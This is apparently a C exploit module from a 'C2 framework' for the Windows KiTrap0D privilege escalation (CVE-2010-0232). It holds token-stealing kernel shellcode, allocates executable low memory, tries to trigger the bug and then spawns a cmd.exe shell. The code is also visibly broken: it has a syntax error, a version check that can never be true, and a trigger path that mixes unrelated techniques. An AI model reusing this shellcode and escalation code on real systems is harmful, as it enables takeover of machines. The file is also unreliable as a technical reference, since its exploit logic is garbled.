/*
 * Cardinal C2 Framework - MS10-015 Exploit Module
 * CVE-2010-0232 - Windows Kernel win32k.sys Privilege Escalation
 * Target: Windows XP, Vista, 7, Server 2003/2008
 * Type: Local Privilege Escalation
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment(lib, "user32.lib")

typedef NTSTATUS (WINAPI *PNTQUERYINTERVALPROFILE)(
    DWORD ProfileSource,
    PULONG Interval
);

void print_banner() {
    printf("\n");
    printf("Cardinal C2 - MS10-015 Exploit Module\n");
    printf("CVE-2010-0232 - Windows Kernel Privilege Escalation\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

BOOL is_elevated() {
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        
        if (GetTokenInformation(hToken, TokenElevation, &elevation, 
            sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    
    return isElevated;
}

BOOL exploit_ms10015() {
    printf("[*] Current elevation: %s\n", is_elevated() ? "Elevated" : "Not Elevated");
    printf("[*] Attempting privilege escalation via KiTrap0D...\n");
    
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("[!] Failed to load ntdll.dll\n");
        return FALSE;
    }
    
    PNTQUERYINTERVALPROFILE NtQueryIntervalProfile = 
        (PNTQUERYINTERVALPROFILE)GetProcAddress(hNtdll, "NtQueryIntervalProfile");
    
    if (!NtQueryIntervalProfile) {
        printf("[!] Failed to get NtQueryIntervalProfile\n");
        FreeLibrary(hNtdll);
        return FALSE;
    }
    
    printf("[+] NtQueryIntervalProfile: 0x%p\n", NtQueryIntervalProfile);
    
    // Allocate memory in usermode for shellcode
    LPVOID usermode_addr = VirtualAlloc((LPVOID)0x1, 0x1000,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!usermode_addr) {
        printf("[!] Failed to allocate memory at low address\n");
        FreeLibrary(hNtdll);
        return FALSE;
    }
    
    printf("[+] Allocated memory at 0x%p\n", usermode_addr);
    
    // Token stealing shellcode for Windows 7/Vista/XP
    unsigned char shellcode[] = 
        "\x60"                              // pushad
        "\x64\x8B\x15\x24\x01\x00\x00"      // mov edx, fs:[0x124]
        "\x8B\x42\x50"                      // mov eax, [edx+0x50]
        "\x89\xC1"                          // mov ecx, eax
        "\xBA\x04\x00\x00\x00"              // mov edx, 4 (SYSTEM PID)
        
        // Find SYSTEM process
        "\x8B\x80\xB8\x00\x00\x00"          // mov eax, [eax+0xB8]
        "\x2D\xB8\x00\x00\x00"              // sub eax, 0xB8
        "\x39\x90\xB4\x00\x00\x00"          // cmp [eax+0xB4], edx
        "\x75\xED"                          // jnz loop
        
        // Steal token
        "\x8B\x90\xF8\x00\x00\x00"          // mov edx, [eax+0xF8]
        "\x89\x91\xF8\x00\x00\x00"          // mov [ecx+0xF8], edx
        
        "\x61"                              // popad
        "\x31\xC0"                          // xor eax, eax
        "\xC3";                             // ret
    
    memcpy(usermode_addr, shellcode, sizeof(shellcode) - 1);
    
    printf("[*] Shellcode planted at usermode address\n");
    printf("[*] Triggering KiTrap0D vulnerability...\n");
    
    // Trigger vulnerability through NtQueryIntervalProfile
    ULONG interval;
    
    for (int i = 0; i < 10; i++) {
        NtQueryIntervalProfile(2, &interval);
    }
    
    // Create window to trigger kernel callback
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = DefWindowProcA;
    wc.lpszClassName = "KiTrap0D";
    wc.cbWndExtra = sizeof(LPVOID) * 4;
    
    if (!RegisterClassA(&wc)) {
        printf("[!] Failed to register window class\n");
        VirtualFree(usermode_addr, 0, MEM_RELEASE);
        FreeLibrary(hNtdll);
        return FALSE;
    }
    
    HWND hwnd = CreateWindowA("KiTrap0D", "", 0, 0, 0, 0, 0, 
        NULL, NULL, NULL, NULL);
    
    if (!hwnd) {
        printf("[!] Failed to create window\n");
        VirtualFree(usermode_addr, 0, MEM_RELEASE);
        FreeLibrary(hNtdll);
        return FALSE;
    }
    
    printf("[+] Trigger window created\n");
    
    // Set window callback to point to our shellcode
    SetWindowLongA(hwnd, 0, (LONG)usermode_addr);
    
    printf("[*] Executing privilege escalation...\n");
    
    // Trigger the callback
    SendMessageA(hwnd, WM_NULL, 0, 0);
    
    Sleep(500);
    
    DestroyWindow(hwnd);
    UnregisterClassA("KiTrap0D", NULL);
    VirtualFree(usermode_addr, 0, MEM_RELEASE);
    FreeLibrary(hNtdll);
    
    printf("[*] Checking elevation status...\n");
    
    if (is_elevated()) {
        printf("[+] SUCCESS! Process is now elevated\n");
        return TRUE;
    } else {
        printf("[-] Elevation check failed\n");
        printf("[*] Note: This is a proof-of-concept implementation\n");
        return FALSE;
    }
}

int main(int argc, char* argv[]) {
    print_banner();
    
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA));
    
    if (GetVersionExA(&osvi)) {
        printf("[*] OS: Windows %d.%d Build %d\n",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        
        if (osvi.dwMajorVersion < 6 && osvi.dwMajorVersion > 7) {
            printf("[!] Warning: This exploit targets Windows XP - Windows 7\n");
        }
    }
    
    printf("[*] Starting KiTrap0D privilege escalation\n\n");
    
    if (exploit_ms10015()) {
        printf("\n[+] Exploit successful!\n");
        printf("[*] Spawning elevated shell...\n");
        system("cmd.exe");
        return 0;
    } else {
        printf("\n[!] Exploit failed\n");
        return 1;
    }
}
